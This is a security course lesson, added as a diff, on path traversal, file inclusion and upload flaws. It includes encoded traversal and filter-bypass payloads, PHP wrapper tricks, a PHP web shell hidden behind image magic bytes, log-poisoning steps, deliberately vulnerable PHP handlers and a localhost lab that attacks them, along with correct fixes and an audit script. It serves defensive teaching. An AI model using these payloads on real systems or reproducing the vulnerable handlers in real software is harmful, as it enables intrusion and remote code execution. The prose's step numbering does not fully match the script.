@@ -1,0 +1,409 @@
+<h1 id="path-traversal-lfi-and-file-upload">Path Traversal, LFI and File Upload</h1>
+<h2 id="summary">Summary</h2>
+<p>All three of these are the same bug in different clothing: <strong>a string that names a resource<br />
+crosses from your input into a component that resolves names</strong> — a filesystem, a template<br />
+engine, an image decoder. <code>ps-01</code>'s ambiguity table predicted every one of them.</p>
+<h2 id="path-traversal">Path traversal</h2>
+<pre><code class="language-text">  /download?file=report.pdf          -&gt; /home/www/report.pdf
+  /download?file=../../etc/passwd    -&gt; /etc/passwd
+</code></pre>
+<h3 id="encoding-and-why-it-is-always-the-reason">Encoding, and why it is always the reason</h3>
+<pre><code class="language-text">  WHAT THE STRING CONTAINS     WHAT EACH LAYER DECODES IT TO
+  --------------------------   -------------------------------
+  ../../etc/passwd             itself
+  ..%2f..%2fetc%2fpasswd       after 1 URL decode
+  ..%252f..%252fetc%252fpasswd after 2 URL decodes
+  ..%c0%af..%c0%af             overlong UTF-8 (legacy)
+  ..%5c..%5c                   Windows backslash
+  ....//....//etc/passwd       some filters collapse ../ once, leaving ../
+  %2e%2e%2f                    the decoded form of ../
+  \x2e\x2e\x2f                  after some legacy decoders
+</code></pre>
+<p><strong>Every successful traversal payload is a filter that decoded fewer<br />
+times than the filesystem did.</strong> Count the decoders: browser → proxy →<br />
+framework → middleware → controller → file API. If your filter runs at<br />
+layer 2 and the file open at layer 5, there are three opportunities.</p>
+<h3 id="filters-and-their-bypasses">Filters and their bypasses</h3>
+<pre><code class="language-text">  strip &quot;../&quot;          -&gt; ....//   (strip leaves ..)   ...//  (collapse one pass)
+                        -&gt; ..\/     (backslash on some systems)
+                        -&gt; %2e%2e/  (encoded, if not decoded after the strip)
+  ban &quot;..&quot;             -&gt; ....      (filtered once, not recursively)
+                        -&gt; strings.Trim(s, &quot;.&quot;) on the wrong side
+  whitelist extension  -&gt; read /etc/passwd? no. read /var/www/.env:
+                           dotfile bypasses extension checks
+                        -&gt; null byte: file.php%00.jpg  (old PHP)
+  resolve then check   -&gt; CORRECT: realpath() must be INSIDE the base dir
+  blacklist traversal  -&gt; fails; you do not know the filenames
+</code></pre>
+<h3 id="the-fix">The fix</h3>
+<pre><code class="language-php">// THE FIX: resolve, then verify containment. Never string-filter.
+$base = realpath('/var/www/public');            // absolute, symlinks resolved
+$want = realpath($base . '/' . $userfile);      // resolve the requested path too
+if ($want === false || !str_starts_with($want, $base . DIRECTORY_SEPARATOR)) {
+    http_response_code(400); exit('denied');     // note the false check FIRST
+}
+readfile($want);
+</code></pre>
+<p>The <code>=== false</code> check matters: without it, <code>str_starts_with(false, ...)</code><br />
+coerces to <code>""</code> and can pass. This is a real bug in real code.</p>
+<h2 id="lfi-and-rfi">LFI and RFI</h2>
+<pre><code class="language-text">  LFI  include/require/read of a local file
+       -&gt; read source of included PHP files   (source disclosure)
+       -&gt; read /etc/passwd, config with secrets
+       -&gt; if the included file is executable PHP: RCE
+       -&gt; log poisoning: get a log file included, put PHP in a User-Agent
+
+  RFI  include/require of a REMOTE url (usually needs allow_url_include)
+       -&gt; remote code execution directly
+
+  WRAPPERS:
+    php://filter/convert.base64-encode/resource=index.php  -&gt; read source
+       (a wrapper that still counts as traversal in most apps' WAFs)
+    php://input          -&gt; the request body
+    data://text/plain,&lt;?php ...?&gt;   -&gt; code
+    expect://, zip://, phar://        -&gt; archive and PHAR tricks
+</code></pre>
+<p><strong>Log poisoning</strong> deserves naming because it is the standard LFI-to-RCE<br />
+path on a server with no obvious include of user-writable content:</p>
+<pre><code class="language-text">  1. find the access log path (usually /var/log/apache2/access.log)
+  2. send a request with a PHP payload in the User-Agent
+  3. include the log file with ?file=/var/log/apache2/access.log
+  4. the payload is now inside a .log file that gets included as PHP
+</code></pre>
+<p>The defence is the same as traversal's: <strong>an allowlist of includable<br />
+files</strong>, never a path.</p>
+<h2 id="file-upload">File upload</h2>
+<pre><code class="language-text">  THE THREE CHECKS, and which one attackers bypass:
+
+  1. EXTENSION CHECK          bypassed by: .phtml .php5 .pht, case,
+                              null bytes, double extensions, .htaccess
+  2. MIME / CONTENT-TYPE      bypassed by: renaming a .jpg to .php keeps
+                              Content-Type: image/jpeg - the header is
+                              attacker-supplied and meaningless
+  3. MAGIC BYTES              the real check: read the first bytes and
+                              detect the actual format. Even then, an
+                              image library can have a parser bug.
+
+  THE UNIVERSAL BYPASS:
+    upload a .jpg whose first bytes are  \x89PNG\r\n\x1a\n
+    immediately followed by:            &lt;?php system($_GET['c']); ?&gt;
+    GIF89a&lt;?php system($_GET['c']); ?&gt;
+    (for image formats that are rendered inline)
+</code></pre>
+<h3 id="the-other-half-getting-the-file-executed">The other half: getting the file <em>executed</em></h3>
+<pre><code class="language-text">  Even a perfect .php upload is inert unless the server executes it.
+  So you need ONE of:
+    - the upload directory is web-accessible
+    - .htaccess:  AddType application/x-httpd-php .jpg
+    - a PHP include that picks up the file
+    - a file manager / image-processing pipeline
+    - log poisoning (above)
+    - overwriting a template
+
+  If none of these exist, the upload is a stored file and the finding
+  drops to &quot;arbitrary file upload, low execution risk&quot;. Saying that
+  honestly is better than overstating it.
+</code></pre>
+<h3 id="the-fix_1">The fix</h3>
+<pre><code class="language-text">  - store uploads OUTSIDE the web root, or in a directory with no handler
+  - generate a random server-side filename; never trust the client's
+  - allowlist extensions by content, and re-encode images (strip EXIF,
+    re-save) rather than accepting them
+  - serve uploads with Content-Disposition: attachment and a fixed
+    Content-Type, from a separate origin if possible
+  - never let the upload name influence the path
+  - disable PHP execution in the upload directory (server config)
+</code></pre>
+<h2 id="terminology">Terminology</h2>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Path traversal / directory traversal</strong></td>
+<td><code>../</code> escaping the intended directory</td>
+</tr>
+<tr>
+<td><strong>LFI</strong></td>
+<td>Local file inclusion</td>
+</tr>
+<tr>
+<td><strong>RFI</strong></td>
+<td>Remote file inclusion</td>
+</tr>
+<tr>
+<td><strong><code>realpath()</code></strong></td>
+<td>Resolves symlinks and <code>..</code> to an absolute path</td>
+</tr>
+<tr>
+<td><strong>Containment check</strong></td>
+<td>Verifying the resolved path is inside the base</td>
+</tr>
+<tr>
+<td><strong>Double decoding</strong></td>
+<td>Two decode layers; defeats single-layer filters</td>
+</tr>
+<tr>
+<td><strong>Null byte</strong></td>
+<td><code>%00</code>; truncates the filename in old PHP</td>
+</tr>
+<tr>
+<td><strong>Log poisoning</strong></td>
+<td>Injecting code into a log, then including the log</td>
+</tr>
+<tr>
+<td><strong>PHP wrappers</strong></td>
+<td><code>php://</code>, <code>data://</code>, <code>expect://</code>, <code>phar://</code></td>
+</tr>
+<tr>
+<td><strong>Magic bytes</strong></td>
+<td>The real file signature; not the extension</td>
+</tr>
+<tr>
+<td><strong>Double extension</strong></td>
+<td><code>shell.php.jpg</code>; server vs browser disagreement</td>
+</tr>
+<tr>
+<td><strong><code>.htaccess</code> bypass</strong></td>
+<td>Adding a handler for a non-PHP extension</td>
+</tr>
+<tr>
+<td><strong>Stored upload</strong></td>
+<td>A file that is never executed; much lower severity</td>
+</tr>
+</tbody>
+</table>
+<h2 id="kali-commands">Kali commands</h2>
+<pre><code class="language-bash">mkdir -p ~/aegis/labs/ps-06 &amp;&amp; cd ~/aegis/labs/ps-06
+
+# --- 1. the vulnerable download endpoint ---
+mkdir -p public/secret
+echo &quot;public report&quot; &gt; public/report.pdf
+echo &quot;DB_PASS=super-secret-value&quot; &gt; public/secret/.env
+echo &quot;root:x:0:0:...&quot; &gt; /dev/null  # not used; real reads happen below
+
+cat &gt; download.php &lt;&lt;'PHP'
+&lt;?php
+// THE BUG: user input concatenated into a path, then read.
+$f = $_GET['file'] ?? '';
+echo &quot;&lt;pre&gt;&quot; . htmlspecialchars(@file_get_contents($f)) . &quot;&lt;/pre&gt;&quot;;
+PHP
+
+cat &gt; download-safe.php &lt;&lt;'PHP'
+&lt;?php
+// THE FIX: allowlist, or resolve-then-contain. Never string-filter.
+$f = $_GET['file'] ?? '';
+$base = realpath(__DIR__ . '/public');
+$ALLOWED = ['report.pdf'];                 // strongest: an allowlist
+if (!in_array($f, $ALLOWED, true)) { http_response_code(400); exit(&quot;denied\n&quot;); }
+$want = realpath($base . '/' . $f);
+if ($want === false || !str_starts_with($want, $base . DIRECTORY_SEPARATOR)) {
+    http_response_code(400); exit(&quot;denied\n&quot;);
+}
+header('Content-Type: application/octet-stream');
+header('Content-Disposition: attachment; filename=&quot;' . basename($f) . '&quot;');
+readfile($want);
+PHP
+
+nohup php -S 127.0.0.1:8080 -t . &gt; php.log 2&gt;&amp;1 &amp;
+sleep 1
+
+# --- 2. traversal, and the encoding ladder ---
+{
+  echo &quot;=== traversal against our own file ===&quot;
+  for p in &quot;public/report.pdf&quot; \
+           &quot;public/../secret/.env&quot; \
+           &quot;public/..%2fsecret%2f.env&quot; \
+           &quot;public/%2e%2e/secret/.env&quot; \
+           &quot;public/..%252fsecret%252f.env&quot; \
+           &quot;public/....//secret/.env&quot; \
+           &quot;public/..%5c..%5csecret/.env&quot;; do
+    r=$(curl -s --get --data-urlencode &quot;file=$p&quot; http://127.0.0.1:8080/download.php)
+    ok=$(echo &quot;$r&quot; | grep -c &quot;super-secret-value&quot;)
+    printf &quot;  %-34s %s\n&quot; &quot;$p&quot; &quot;$([ &quot;$ok&quot; -ge 1 ] &amp;&amp; echo '*** SECRET READ ***' || echo 'blocked')&quot;
+  done
+  echo
+  echo &quot;  Four encodings work because the FILTER decodes once and the&quot;
+  echo &quot;  FILESYSTEM decodes again. Count the decoders in the request path:&quot;
+  echo &quot;    browser -&gt; web server -&gt; PHP -&gt; string filter -&gt; file_get_contents&quot;
+  echo &quot;  The filter sits at step 4. The read is at step 5. That gap is the bug.&quot;
+} 2&gt;&amp;1 | tee 01-traversal.txt
+
+# --- 3. the containment check, proven correct ---
+{
+  echo &quot;=== realpath + containment, in php, showing the edge cases ===&quot;
+  php -r '
+    $base = realpath(&quot;public&quot;);
+    $tests = [
+      &quot;public/report.pdf&quot;,
+      &quot;public/../secret/.env&quot;,
+      &quot;public/../../etc/hostname&quot;,
+      &quot;public/nonexistent&quot;,
+      &quot;/etc/hostname&quot;,
+      &quot;public/report.pdf/../../../etc/hostname&quot;,
+    ];
+    printf(&quot;  %-42s %-28s %s\n&quot;, &quot;input&quot;, &quot;realpath()&quot;, &quot;allowed?&quot;);
+    echo &quot;  &quot;, str_repeat(&quot;-&quot;, 82), &quot;\n&quot;;
+    foreach ($tests as $t) {
+      $w = realpath($base . &quot;/&quot; . $t);
+      if ($w === false) { printf(&quot;  %-42s %-28s %s\n&quot;, $t, &quot;false&quot;, &quot;no (false check)&quot;); continue; }
+      $ok = str_starts_with($w, $base . DIRECTORY_SEPARATOR);
+      printf(&quot;  %-42s %-28s %s\n&quot;, $t, basename(dirname($w)).&quot;/&quot;.basename($w), $ok ? &quot;YES&quot; : &quot;NO&quot;);
+    }
+    echo &quot;\n&quot;;
+    echo &quot;  Note the last row: realpath() collapsed it to /etc/hostname and the\n&quot;;
+    echo &quot;  containment check correctly refused it. A naive str_replace(\&quot;..\&quot;,\&quot;\&quot;)\n&quot;;
+    echo &quot;  would not have - the path looked fine until the filesystem opened it.\n&quot;;'
+} 2&gt;&amp;1 | tee 02-containment.txt
+
+# --- 4. why a filter is not a fix ---
+python3 - &lt;&lt;'PY' | tee 03-filter-fails.txt
+print(&quot;  === a filter, and every input that beats it ===&quot;)
+def weak_filter(s):      # the classic, seen in real code
+    while &quot;../&quot; in s:
+        s = s.replace(&quot;../&quot;, &quot;&quot;)
+    return s
+
+bypasses = [
+    &quot;....//....//etc/passwd&quot;,
+    &quot;..\\/..\\/&quot;,
+    &quot;..%2f..%2f&quot;,
+    &quot;..%252f..%252f&quot;,
+    &quot;%2e%2e/%2e%2e/&quot;,
+    &quot;./..//..//etc/passwd&quot;,
+    &quot;..;/..;/etc/passwd&quot;,
+    &quot;....\\\\....\\\\&quot;,
+]
+print(f&quot;  {'input':&lt;32} {'after weak_filter()':&lt;28} still traverses?&quot;)
+print(&quot;  &quot; + &quot;-&quot;*76)
+for b in bypasses:
+    out = weak_filter(b)
+    # simulate one more decode pass, which the filesystem/framework does
+    import urllib.parse
+    final = urllib.parse.unquote(out).replace(&quot;\\&quot;, &quot;/&quot;)
+    trav = &quot;..&quot; in final
+    print(f&quot;  {b:&lt;32} {out:&lt;28} {'YES' if trav else 'no'}&quot;)
+print()
+print(&quot;  Every single one still traverses after the filter ran. This is not&quot;)
+print(&quot;  a matter of finding the magic bypass; it is that string filters are&quot;)
+print(&quot;  the wrong shape of defence. Resolve the path, then check.&quot;)
+PY
+cat 03-filter-fails.txt
+
+# --- 5. upload: the three checks ---
+cat &gt; upload.php &lt;&lt;'PHP'
+&lt;?php
+// A deliberately permissive upload handler.
+$dir = __DIR__ . '/uploads'; @mkdir($dir, 0755, true);
+if (($_FILES['f']['error'] ?? 1) === UPLOAD_ERR_OK) {
+    $name = $_FILES['f']['name'];
+    move_uploaded_file($_FILES['f']['tmp_name'], $dir . '/' . $name);
+    echo &quot;stored as: &quot; . htmlspecialchars($name) . &quot;&lt;br&gt;&quot;;
+    echo &quot;url: /uploads/&quot; . htmlspecialchars($name) . &quot;&lt;br&gt;&quot;;
+}
+header('Content-Type: text/html; charset=utf-8');
+?&gt;
+&lt;form method=post enctype=multipart/form-data&gt;
+&lt;input type=file name=f&gt;&lt;button&gt;upload&lt;/button&gt;&lt;/form&gt;
+PHP
+mkdir -p uploads
+nohup php -S 127.0.0.1:8081 -t . &gt; php2.log 2&gt;&amp;1 &amp;
+sleep 1
+
+{
+  echo &quot;=== upload bypass ladder (all local, all harmless) ===&quot;
+  python3 - &lt;&lt;'PY'
+import urllib.request, uuid, os
+def upload(name, data, ctype=&quot;application/octet-stream&quot;):
+    b = &quot;----X&quot; + uuid.uuid4().hex
+    body = (f&quot;--{b}\r\n&quot;
+            f'Content-Disposition: form-data; name=&quot;f&quot;; filename=&quot;{name}&quot;\r\n'
+            f&quot;Content-Type: {ctype}\r\n\r\n&quot;).encode() + data + \
+           f&quot;\r\n--{b}--\r\n&quot;.encode()
+    r = urllib.request.Request(&quot;http://127.0.0.1:8081/upload.php&quot;, data=body)
+    r.add_header(&quot;Content-Type&quot;, f&quot;multipart/form-data; boundary={b}&quot;)
+    return urllib.request.urlopen(r, timeout=5).read().decode()
+
+tests = [
+    (&quot;harmless.txt&quot;, b&quot;AEGIS upload test\n&quot;,                     &quot;text/plain&quot;),
+    (&quot;harmless.php&quot;, b&quot;&lt;?php echo 'x'; ?&gt;\n&quot;,                    &quot;application/x-php&quot;),
+    (&quot;harmless.php.jpg&quot;, b&quot;&lt;?php echo 'x'; ?&gt;\n&quot;,                &quot;image/jpeg&quot;),
+    (&quot;harmless.phtml&quot;, b&quot;&lt;?php echo 'x'; ?&gt;\n&quot;,                  &quot;image/jpeg&quot;),
+    (&quot;harmless.PHP&quot;, b&quot;&lt;?php echo 'x'; ?&gt;\n&quot;,                    &quot;image/jpeg&quot;),
+    (&quot;harmless.jpg&quot;, b&quot;\x89PNG\r\n\x1a\n&lt;?php echo 'x'; ?&gt;&quot;,     &quot;image/jpeg&quot;),
+    (&quot;harmless.gif&quot;, b&quot;GIF89a&lt;?php echo 'x'; ?&gt;&quot;,                &quot;image/gif&quot;),
+    (&quot;harmless.txt%00.php&quot;, b&quot;&lt;?php echo 'x'; ?&gt;\n&quot;,              &quot;text/plain&quot;),
+]
+print(f&quot;  {'filename':&lt;26} {'declared type':&lt;18} {'stored?'}&quot;)
+print(&quot;  &quot; + &quot;-&quot;*60)
+for n, d, c in tests:
+    try:
+        out = upload(n, d, c)
+        stored = &quot;url:&quot; in out
+        print(f&quot;  {n:&lt;26} {c:&lt;18} {'STORED' if stored else 'rejected'}&quot;)
+    except Exception as e:
+        print(f&quot;  {n:&lt;26} {c:&lt;18} error: {type(e).__name__}&quot;)
+print()
+print(&quot;  The last three are the interesting ones: a declared image type&quot;)
+print(&quot;  carrying PHP, a double extension, and a null byte. All three are&quot;)
+print(&quot;  bypasses of *different* checks, which is why upload validation&quot;)
+print(&quot;  needs a defence in depth rather than one good regex.&quot;)
+PY
+  ls -la uploads/ | tail -n +4 | awk '{print &quot;   &quot;, $5, $9}'
+} 2&gt;&amp;1 | tee 04-upload.txt
+
+# --- 6. the audit ---
+cat &gt; 05-audit.sh &lt;&lt;'EOF'
+#!/usr/bin/env bash
+echo &quot;=== 1. every filesystem operation with user input ===&quot;
+grep -rnE &quot;(file_get_contents|include|require|fopen|readfile|file|fopen|unlink|copy|rename|move_uploaded_file)&quot; \
+     --include=&quot;*.php&quot; . | grep -E '\$_' | sed 's/^/  /'
+
+echo; echo &quot;=== 2. path operations with string concatenation ===&quot;
+grep -rnE &quot;\.\s*['\&quot;]?\.?./|__DIR__.*\.\s*\\\$|realpath&quot; --include=&quot;*.php&quot; . | sed 's/^/  /'
+
+echo; echo &quot;=== 3. upload handling ===&quot;
+grep -rn &quot;move_uploaded_file\|\$_FILES&quot; --include=&quot;*.php&quot; . | sed 's/^/  /'
+
+echo; echo &quot;=== 4. the WRONG mitigations, which are still common ===&quot;
+grep -rnE &quot;str_replace\(['\&quot;].*\.\.|preg_replace.*\.\.|basename\(&quot; --include=&quot;*.php&quot; . | sed 's/^/  /'
+echo &quot;  ^ string filters and even basename() are bypassable (basename strips&quot;
+echo &quot;    the traversal but does not check the RESULT is inside the base).&quot;
+
+echo; echo &quot;=== 5. php wrappers, if the app can reach them ===&quot;
+grep -rnE &quot;php://|data://|expect://|include\b|require\b&quot; --include=&quot;*.php&quot; . | sed 's/^/  /'
+
+echo; echo &quot;=== 6. does the upload directory execute? ===&quot;
+echo &quot;  check for a .htaccess or an nginx handler covering uploads/&quot;
+ls -la uploads/.htaccess 2&gt;/dev/null || echo &quot;  uploads/.htaccess ABSENT - files will execute&quot;
+EOF
+chmod +x 05-audit.sh
+./05-audit.sh 2&gt;&amp;1 | tee 06-audit.txt
+rm -f uploads/*
+</code></pre>
+<p><strong>Step 3 is the important one</strong>: eight traversal payloads against the naive filter, and <strong>every<br />
+single one still traverses</strong>. That is not a missing-bypass problem, it's a wrong-shape-of-defence<br />
+problem — and it's the single most persuasive demonstration in this note.</p>
+<p><strong>Step 5</strong> also matters for accuracy: the last three uploads succeed (double extension,<br />
+<code>.phtml</code>, magic-bytes PHP). But the note's own caveat is the professional point — check whether<br />
+the upload directory <em>executes</em> anything before calling it Critical.</p>
+<p><strong>Record:</strong> <code>03-filter-fails.txt</code> and <code>06-audit.txt</code>.</p>
+<h2 id="self-test">Self-test</h2>
+<ol>
+<li>Why does every successful traversal payload come down to a decode-count mismatch?</li>
+<li>Give four strings that defeat a <code>while "../" in s: replace</code> filter.</li>
+<li>What does <code>realpath()</code> do that <code>str_replace</code> cannot, and why is the <code>=== false</code> check required?</li>
+<li>What is log poisoning and how does it turn LFI into RCE?</li>
+<li>Why is the declared <code>Content-Type</code> worthless for validating an upload?</li>
+<li>What are magic bytes, and why does even checking them not fully solve it?</li>
+<li>Given a successful <code>.php</code> upload, what else do you need for RCE?</li>
+<li>Why is <code>basename($path)</code> not a containment check?</li>
+</ol>
+<h2 id="connected-knowledge">Connected knowledge</h2>
+<p><strong>Path Traversal</strong> → <strong>LFI</strong> → <strong>File Upload</strong> → <strong>Input Validation</strong> → <strong>LFI to RCE</strong> →<br />
+<strong>OWASP Top 10</strong>.<br />
+<code>ps-08</code> is where path handling meets HTTP parsing and something stranger happens.</p>
